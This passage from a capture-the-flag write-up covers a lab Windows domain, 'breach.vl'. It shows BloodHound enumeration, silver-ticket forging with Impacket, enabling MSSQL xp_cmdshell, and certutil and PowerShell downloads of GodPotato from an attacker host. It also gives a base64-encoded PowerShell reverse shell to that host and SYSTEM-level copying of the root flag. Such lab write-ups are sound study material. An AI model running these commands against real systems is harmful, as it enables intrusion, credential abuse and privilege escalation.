>  bloodhound-python -d breach.vl -u 'julia.wong' -p 'Computer1' -dc 'BREACHDC.breach.vl' -c all -ns 10.129.2.189 --dns-tcp  
  
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)  
INFO: Found AD domain: breach.vl  
INFO: Getting TGT for user  
INFO: Connecting to LDAP server: BREACHDC.breach.vl  
INFO: Testing resolved hostname connectivity dead:beef::dd58:a50d:1569:999d  
INFO: Trying LDAP connection to dead:beef::dd58:a50d:1569:999d  
INFO: Testing resolved hostname connectivity dead:beef::f4  
INFO: Trying LDAP connection to dead:beef::f4  
INFO: Found 1 domains  
INFO: Found 1 domains in the forest  
INFO: Found 1 computers  
INFO: Connecting to LDAP server: BREACHDC.breach.vl  
INFO: Testing resolved hostname connectivity dead:beef::dd58:a50d:1569:999d  
INFO: Trying LDAP connection to dead:beef::dd58:a50d:1569:999d  
INFO: Testing resolved hostname connectivity dead:beef::f4  
INFO: Trying LDAP connection to dead:beef::f4  
INFO: Found 15 users  
INFO: Found 54 groups  
INFO: Found 2 gpos  
INFO: Found 2 ous  
WARNING: Re-establishing connection with server  
INFO: Connecting to LDAP server: BREACHDC.breach.vl  
INFO: Testing resolved hostname connectivity dead:beef::dd58:a50d:1569:999d  
INFO: Trying LDAP connection to dead:beef::dd58:a50d:1569:999d  
INFO: Testing resolved hostname connectivity dead:beef::f4  
INFO: Trying LDAP connection to dead:beef::f4  
ERROR: Failed to resolve LDAP server IP  
ERROR: Connection to LDAP server lost during data gathering - reconnect failed - giving up on query (|(objectClass=container)(objectClass=organizationalUnit)(sAMAccountType=805306369)(objectClass=group)(&(objec  
tCategory=person)(objectClass=user)))  
WARNING: Re-establishing connection with server  
INFO: Connecting to LDAP server: BREACHDC.breach.vl  
INFO: Testing resolved hostname connectivity dead:beef::dd58:a50d:1569:999d  
INFO: Trying LDAP connection to dead:beef::dd58:a50d:1569:999d  
INFO: Testing resolved hostname connectivity dead:beef::f4  
INFO: Trying LDAP connection to dead:beef::f4  
ERROR: Failed to resolve LDAP server IP  
ERROR: Connection to LDAP server lost during data gathering - reconnect failed - giving up on query (|(objectClass=container)(objectClass=organizationalUnit)(sAMAccountType=805306369)(objectClass=group)(&(objec  
tCategory=person)(objectClass=user)))  
WARNING: Re-establishing connection with server  
INFO: Connecting to LDAP server: BREACHDC.breach.vl  
INFO: Testing resolved hostname connectivity dead:beef::dd58:a50d:1569:999d  
INFO: Trying LDAP connection to dead:beef::dd58:a50d:1569:999d  
INFO: Testing resolved hostname connectivity dead:beef::f4  
INFO: Trying LDAP connection to dead:beef::f4  
INFO: Found 19 containers  
INFO: Found 0 trusts  
INFO: Starting computer enumeration with 10 workers  
INFO: Querying computer: BREACHDC.breach.vl  
INFO: Done in 04M 33S

>  ls -lh *.json 2>/dev/null | head  
  
-rw-r--r-- 1 vagabond vagabond   74 May 24 16:32 20260524163120_computers.json  
-rw-r--r-- 1 vagabond vagabond  24K May 24 16:32 20260524163120_containers.json  
-rw-r--r-- 1 vagabond vagabond 3.1K May 24 16:32 20260524163120_domains.json  
-rw-r--r-- 1 vagabond vagabond 3.9K May 24 16:32 20260524163120_gpos.json  
-rw-r--r-- 1 vagabond vagabond  81K May 24 16:32 20260524163120_groups.json  
-rw-r--r-- 1 vagabond vagabond 4.1K May 24 16:32 20260524163120_ous.json  
-rw-r--r-- 1 vagabond vagabond  35K May 24 16:32 20260524163120_users.json  
-rw-r--r-- 1 vagabond vagabond 3.7K May 24 16:37 20260524163257_computers.json  
-rw-r--r-- 1 vagabond vagabond  24K May 24 16:37 20260524163257_containers.json  
-rw-r--r-- 1 vagabond vagabond 3.1K May 24 16:37 20260524163257_domains.json
```

First, we inspect the domains.json file for the Windows Domain SID, then we use `pypykatz` to extract from nvc_mssql a nthash :

```bash
>  grep -oE 'S-1-5-21-[0-9-]+' 20260524163257_domains.json | head -1  
  
S-1-5-21-2330692793-3312915120-706255856

>  pypykatz crypto nt Trustno1  
  
[REDACTED]
```

We got our ticket ingredients, along with the `DNS_Computer_Name: BREACHDC.breach.vl` from `tcp/1433` we got from enumeration. Enumeration is key.

We can now use `ticketer.py` from Impacket.

```bash
>  ticketer.py -spn 'MSSQLSvc/BREACHDC.breach.vl:1433' \  
> -domain-sid 'S-1-5-21-2330692793-3312915120-706255856' \                                                            
> -nthash [REDACTED] \                                                  
> -domain breach.vl -dc-ip 10.129.2.189 \                                                       
> -user-id 500 Administrator                                                                                                    
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Creating basic skeleton ticket and PAC Infos  
[*] Customizing ticket for breach.vl/Administrator  
[*]     PAC_LOGON_INFO  
[*]     PAC_CLIENT_INFO_TYPE  
[*]     EncTicketPart  
[*]     EncTGSRepPart  
[*] Signing/Encrypting final ticket  
[*]     PAC_SERVER_CHECKSUM  
[*]     PAC_PRIVSVR_CHECKSUM  
[*]     EncTicketPart  
[*]     EncTGSRepPart  
[*] Saving ticket in Administrator.ccache
```

Then, we export the ticket as our KRB5 name to login via mssql as Administrator with no password :

```bash
> export KRB5CCNAME=Administrator.ccache
>  mssqlclient.py -k -no-pass -windows-auth BREACHDC.breach.vl  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Encryption required, switching to TLS  
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master  
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english  
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192  
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.  
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.  
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)  
[!] Press help for extra shell commands  
SQL (BREACH\Administrator  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');  
      
-      
1
```

We are now sysadmin.

```bash
SQL (BREACH\Administrator  dbo@master)> EXEC sp_configure 'show advanced options', 1;  
INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.  
SQL (BREACH\Administrator  dbo@master)> RECONFIGURE  
SQL (BREACH\Administrator  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;  
INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.  
SQL (BREACH\Administrator  dbo@master)> RECONFIGURE  
SQL (BREACH\Administrator  dbo@master)> EXEC xp_cmdshell 'whoami';  
output                
----------------      
breach\svc_mssql      
NULL
SQL (BREACH\Administrator  dbo@master)> EXEC xp_cmdshell 'whoami /priv'  
output                                                                                
--------------------------------------------------------------------------------      
NULL                                                                                  
PRIVILEGES INFORMATION                                                                
----------------------                                                                
NULL                                                                                  
Privilege Name                Description                               State         
============================= ========================================= ========      
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled      
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled      
SeMachineAccountPrivilege     Add workstations to domain                Disabled      
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled       
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled       
SeImpersonatePrivilege        Impersonate a client after authentication Enabled       
SeCreateGlobalPrivilege       Create global objects                     Enabled       
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled      
NULL
```

We see something that shines in the terminal : 
`SeImpersonatePrivilege Impersonate a client after authentication Enabled` which means we can impersonate a priviledged client.

I downloaded GodPotato-NET4 first to try to inject it via Powershell :

```bash
SQL (BREACH\Administrator  dbo@master)> exec xp_cmdshell 'powershell -c IWR -Uri http://10.10.14.12/GodPotato-NET4.exe -OutFile C:\Windows\Temp\GodPotato-NET4.exe"';  
output                                                                                                                       
-----------------------------------------------------------------------------------------------------------------------      
IWR : <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">          
<html xmlns="http://www.w3.org/1999/xhtml">                                                                                  
<head>                                                                                                                       
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>                                                    
<title>401 - Unauthorized: Access is denied due to invalid credentials.</title>                                              
<style type="text/css">                                                                                                      
<!--                                                                                                                         
body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}                          
fieldset{padding:0 15px 10px 15px;}                                                                                          
h1{font-size:2.4em;margin:0;color:#FFF;}                                                                                     
h2{font-size:1.7em;margin:0;color:#CC0000;}                                                                                  
h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;}                                                                         
#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;           
background-color:#555555;}                                                                                                   
#content{margin:0 0 0 2%;position:relative;}                                                                                 
.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}                                 
-->                                                                                                                          
</style>                                                                                                                     
</head>                                                                                                                      
<body>                                                                                                                       
<div id="header"><h1>Server Error</h1></div>                                                                                 
<div id="content">                                                                                                           
<div class="content-container"><fieldset>                                                                                   
 <h2>401 - Unauthorized: Access is denied due to invalid credentials.</h2>                                                  
 <h3>You do not have permission to view this directory or page using the credentials that you supplied.</h3>                
</fieldset></div>                                                                                                           
</div>                                                                                                                       
</body>                                                                                                                      
</html>                                                                                                                      
At line:1 char:1                                                                                                             
+ IWR -Uri http://10.10.14.12/GodPotato-NET4.exe -OutFile C:\Windows\Te ...                                                  
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                      
   + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc       
  eption                                                                                                                    
   + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand            
NULL
```

This didn't work. First, I didn't have a dedicated http webserver, and second, the syntax.

```bash
>  cd /home/vagabond/Downloads  
sudo python3 -m http.server 8080  
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.14.12 - - [24/May/2026 17:20:57] "HEAD /GodPotato-NET4.exe HTTP/1.1" 200 -
```

200 - Ok means it works. No error 404, it has access to GodPotato.

This time, we download with certutil on BREACH\Administrator since we can't type root yet :

```bash
SQL (BREACH\Administrator  dbo@master)> EXEC xp_cmdshell 'type C:\Users\Administrator\Desktop\root.txt';  
output                 
-----------------      
Access is denied
```

```bash
SQL (BREACH\Administrator  dbo@master)> EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.12:8080/GodPotato-NET4.exe C:\Windows\Temp\gp.exe';  
  
output                                                                                    
------------------------------------------------------------------------------------      
****  Online  ****                                                                        
 0000  ...                                                                               
 01cc                                                                                    
CertUtil: -URLCache command FAILED: 0x80190194 (-2145844844 HTTP_E_STATUS_NOT_FOUND)      
CertUtil: Not found (404).                                                                
NULL                                                                                      
SQL (BREACH\Administrator  dbo@master)>    
SQL (BREACH\Administrator  dbo@master)> EXEC xp_cmdshell 'type C:\Users\Administrator\Desktop\root.txt';  
output                 
-----------------      
Access is denied.      
NULL                   
SQL (BREACH\Administrator  dbo@master)> EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.12:8080/GodPotato-NET4.exe C:\Windows\Temp\gp.exe';  
output                                                   
---------------------------------------------------      
****  Online  ****                                       
 0000  ...                                              
 e000                                                   
CertUtil: -URLCache command completed successfully.      
NULL
```

It is now registered at `C:\Windows\Temp\gp.exe` (less noisy, no syntax issues).

Netcat listener and we reconnect with the ticket and use a Base64 encoded script :

```bash
nc -lvnp 9001
```

Terminal 2 :

```bash
>  mssqlclient.py -k -no-pass -windows-auth BREACHDC.breach.vl  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Encryption required, switching to TLS  
[-] CCache file is not found. Skipping...  
[-] invalid principal syntax  
>  export KRB5CCNAME=Administrator.ccache  
mssqlclient.py -k -no-pass -windows-auth BREACHDC.breach.vl  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Encryption required, switching to TLS  
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master  
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english  
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192  
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.  
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.  
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)  
[!] Press help for extra shell commands  
SQL (BREACH\Administrator  dbo@master)> EXEC xp_cmdshell 'C:\Windows\Temp\gp.exe -cmd "powershell -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0  
ACgAJwAxADAALgAxADAALgAxADQALgAxADIAJwAsADkAMAAwADEAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAPQAwAC4ALgA2ADUANQAzADUAfAAlACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQA9ACQAcwAuAF  
IAZQBhAGQAKAAkAGIALAAwACwAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAkAGQAPQAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwA  
JABpACkAOwAkAHIAPQAoAGkAZQB4ACAAJABkACAAMgA+ACYAMQB8AE8AdQB0AC0AUwB0AHIAaQBuAGcAKQA7ACQAdAA9ACgAJAByACsAJwBQAFMAIAAnACsAKABwAHcAZAApAC4AUABhAHQAaAArACcAPgAgACcAKQA7ACQAeAA9ACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbg  
BnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJAB0ACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHgALAAwACwAJAB4AC4ATABlAG4AZwB0AGgAKQA7ACQAcwAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwAuAEMAbABvAHMAZQAoACkA"';
```

Then, on the listener : 

```bash
Listening on 0.0.0.0 9001

Connection received on 10.129.2.189 57915
```

But no shell.

We'll try to put godpotato via SMB and then execute it on the Administrator xp_cmdshell :

```bash
>  smbclient //10.129.2.189/share -U 'svc_mssql%Trustno1' -c 'cd transfer; lcd /home/vagabond/Downloads; put GodPotato-NET4.exe gp.exe; ls'  
  
putting file GodPotato-NET4.exe as \transfer\gp.exe (123.1 kB/s) (average 123.1 kB/s)  
 .                                   D        0  Sun May 24 17:55:47 2026  
 ..                                  D        0  Sun May 24 15:09:51 2026  
 claire.pope                         D        0  Thu Feb 17 12:21:35 2022  
 diana.pope                          D        0  Thu Feb 17 12:21:19 2022  
 gp.exe                              A    57344  Sun May 24 17:55:47 2026  
 julia.wong                          D        0  Thu Apr 17 02:38:12 2025  
 scrow.url                           A      103  Sun May 24 15:28:11 2026
```

```bash
>  export KRB5CCNAME=$PWD/Administrator.ccache  
  
>  mssqlclient.py -k -no-pass -windows-auth BREACHDC.breach.vl  
  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Encryption required, switching to TLS  
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master  
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english  
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192  
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.  
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.  
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)  
[!] Press help for extra shell commands  
SQL (BREACH\Administrator  dbo@master)> EXEC xp_cmdshell 'dir C:\share\transfer\gp.exe';  
output                                                  
--------------------------------------------------      
Volume in drive C has no label.                        
Volume Serial Number is B465-02B6                      
NULL                                                    
Directory of C:\share\transfer                         
NULL                                                    
05/24/2026  03:55 PM            57,344 gp.exe           
              1 File(s)         57,344 bytes           
              0 Dir(s)   6,382,919,680 bytes free
```

So it worked. Now, we'll try to exfil root.txt to read it back in SMB :

```bash
SQL (BREACH\Administrator  dbo@master)> EXEC xp_cmdshell 'C:\share\transfer\gp.exe -cmd "cmd.exe /c copy /Y C:\Users\Administrator\Desktop\root.txt C:\share\transfer\root.txt"';  
output                                                                                      
--------------------------------------------------------------------------------------      
[*] CombaseModule: 0x140730870923264                                                        
[*] DispatchTable: 0x140730873513848                                                        
[*] UseProtseqFunction: 0x140730872806192                                                   
[*] UseProtseqFunctionParamCount: 6                                                         
[*] HookRPC                                                                                 
[*] Start PipeServer                                                                        
[*] CreateNamedPipe \\.\pipe\5e306e74-c829-464d-b903-05afdfcf7de4\pipe\epmapper             
[*] Trigger RPCSS                                                                           
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046                                     
[*] DCOM obj IPID: 00004402-0b38-ffff-55aa-ebf32e30ffc7                                     
[*] DCOM obj OXID: 0x54b320e14e577e4                                                        
[*] DCOM obj OID: 0xd35a87af5158d779                                                        
[*] DCOM obj Flags: 0x281                                                                   
[*] DCOM obj PublicRefs: 0x0                                                                
[*] Marshal Object bytes len: 100                                                           
[*] UnMarshal Object                                                                        
[*] Pipe Connected!                                                                         
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE                                               
[*] CurrentsImpersonationLevel: Impersonation                                               
[*] Start Search System Token                                                               
[*] PID : 928 Token:0x752  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation      
[*] Find System Token : True                                                                
[*] UnmarshalObject: 0x80070776                                                             
[*] CurrentUser: NT AUTHORITY\SYSTEM                                                        
[*] process start with pid 4060                                                             
       1 file(s) copied.                                                                   
NULL
```

The `Impersonation` misconfig worked, now we get the root.txt from svc_mssql's /transfer file, where we transfered it with SYSTEM rights :

```bash
>  smbclient //10.129.2.189/share -U 'svc_mssql%Trustno1' -c 'get transfer\root.txt root.txt; exit'  
getting file \transfer\root.txt of size 32 as root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

And we read it :

```bash
>  cat root.txt  
[REDACTED]
```

Root flag : [REDACTED]